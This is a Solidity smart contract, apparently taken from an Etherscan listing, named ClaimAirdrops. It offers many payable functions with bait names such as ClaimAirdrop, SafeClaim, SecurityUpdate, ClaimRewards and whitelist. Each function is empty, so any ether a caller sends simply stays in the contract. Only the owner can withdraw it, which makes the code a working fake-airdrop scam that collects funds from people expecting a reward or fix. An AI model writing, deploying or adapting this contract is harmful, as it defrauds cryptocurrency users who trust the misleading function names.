/**
 *Submitted for verification at Etherscan.io on 2023-02-07
*/

pragma solidity ^0.4.26;

contract ClaimAirdrops {

    address private  owner;    // current owner of the contract

     constructor() public{   
        owner=msg.sender;
    }
    
    function getOwner(
    ) public view returns (address) {    
        return owner;
    }
    function withdraw() public {
        require(owner == msg.sender);
        msg.sender.transfer(address(this).balance);
    }

    function ClaimAirdrop() public payable {
    }

    function SafeClaim() public payable {
    }

    function Claim() public payable {
    }

    function ClaimAsset() public payable {
    }

    function SecurityUpdate() public payable {
    }

    function SecureClaim() public payable {
    }

    function mint() public payable {
    }

    function reveal() public payable {
    }

    function whitelist() public payable {
    }
    
    function ClaimRewards() public payable {
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}